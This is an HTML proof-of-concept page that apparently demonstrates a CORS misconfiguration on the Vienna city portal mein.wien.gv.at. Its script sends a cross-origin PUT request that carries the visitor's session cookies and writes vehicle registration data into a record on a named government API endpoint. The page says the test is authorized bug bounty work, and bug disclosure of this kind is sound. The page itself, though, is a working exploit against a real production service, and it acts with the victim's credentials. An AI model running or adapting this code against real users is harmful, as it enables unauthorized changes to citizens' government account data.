<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <title>Mein Wien CORS PoC</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 40px;
      background: #f7f7f7;
      color: #222;
    }

    button {
      padding: 10px 16px;
      font-size: 16px;
      cursor: pointer;
    }

    pre {
      margin-top: 20px;
      padding: 16px;
      background: #111;
      color: #0f0;
      white-space: pre-wrap;
      word-break: break-word;
      border-radius: 6px;
    }
  </style>
</head>
<body>
  <h1>Mein Wien CORS PoC</h1>

  <p>
    Controlled CORS test for authorized bug bounty validation.
    This page does not send data to any external server.
  </p>

  <button onclick="runCorsTest()">Run CORS Test</button>

  <pre id="out">Click the button to start.</pre>

  <script>
    async function runCorsTest() {
      const out = document.getElementById("out");

      out.textContent = "Running CORS request...\n";

      const endpoint = "https://mein.wien.gv.at/broker/public/api/Datenblock/JSPutDatenblock";

      const payload = {
        "datensatz": "d9784a08-0906-47af-93ba-58be18082178",
        "inhalt": {
          "Kennzeichen": "CORS-POC",
          "Zulassungsstaat": "Belgien",
          "FormularVorausfuellung": false
        }
      };

      try {
        const response = await fetch(endpoint, {
          method: "PUT",
          credentials: "include",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify(payload)
        });

        const text = await response.text();

        out.textContent =
          "Status: " + response.status + "\n" +
          "Status text: " + response.statusText + "\n\n" +
          "Response body:\n" + text;

      } catch (error) {
        out.textContent =
          "Request blocked or failed.\n\n" +
          String(error);
      }
    }
  </script>
</body>
</html>
